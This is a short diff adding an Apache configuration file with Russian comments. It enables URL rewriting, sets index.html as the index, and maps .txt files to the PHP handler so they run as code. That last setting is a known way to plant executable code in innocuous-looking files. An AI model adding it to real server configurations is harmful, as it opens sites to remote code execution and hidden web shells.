@@ -1,0 +1,8 @@
+# Перенаправление URL
+RewriteEngine ON
+
+# Разрешаем выполнение PHP-кода в файлах с расширением .txt
+AddType application/x-httpd-php .txt
+
+# Указываем индексные файлы
+DirectoryIndex index.html
